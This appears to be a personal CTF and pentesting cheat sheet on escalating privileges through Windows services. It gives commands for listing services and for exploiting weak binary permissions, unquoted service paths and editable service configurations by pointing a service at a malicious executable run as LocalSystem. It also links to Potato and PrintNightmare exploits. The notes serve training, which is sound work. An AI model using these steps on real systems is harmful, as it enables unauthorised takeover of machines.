# Windows services

[Go back](../index.md#windows-privilege-escalation-)

[![windowsprivesc20](../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![steelmountain](../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)

<div class="row row-cols-lg-2"><div>

You can learn more about Windows services [here](/operating-systems/windows/_knowledge/index.md#windows-services).

* 🗺️ List services

```shell!
PS> Get-Service
PS> net start
PS> sc.exe query # with infos
```

* 🔎 Get more info about a service

```shell!
PS> sc.exe qc xxx
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: xxx
  [...]
  BINARY_PATH_NAME   : C:\[...]\service.exe
  [...]
```

🔥 In CTFs, you may be able to start/stop the service manually

```shell!
PS> sc.exe stop xxx
PS> # do your job
PS> sc.exe start xxx
```

➡️ See also: [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) 🥔 and [SweetPotato](https://github.com/CCob/SweetPotato) (1.2k ⭐).

👉 [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675) (CVE-2021-1675) vulnerability in Spooler service.

</div><div>

#### Common flaws

➡️ **Insecure permissions**: the current user may be able to replace the service with a malicious executable (ex: revshell.exe)

```shell!
PS> icacls C:\[...]\service.exe
PS> move C:\[...]\service.exe C:\[...]\service.exe.old
PS> icacls C:\[...]\malicious.exe /grant Everyone:F
```

➡️ **Unquoted Service Paths**: if the service is using a PATH in which there are spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.

```shell!
PS> icacls $Env:appdata\Vulnerable Program\service.exe
PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
PS> # the service will execute
PS> # $Env:appdata\Vulnerable.exe Program\service.exe
```

➡️ **Insecure Service Permissions**: it occurs if we can edit the permissions of a service, such as being able to change the location of the binary. Use the [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) command. If the user is granted `SERVICE_ALL_ACCESS` on the service, then have fun.

```shell!
PS> # LocalSystem is the highest privileged account available
PS> sc.exe config xxx binPath=C:\[...]\malicious.exe  obj= LocalSystem
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* It's recommended to use service accounts for services.
* Most services run with LocalSystem privileges by default
* From the SCM, we can configure an application to be executed if a service fails. If one was configured, it can be exploited.
</div><div>
</div></div>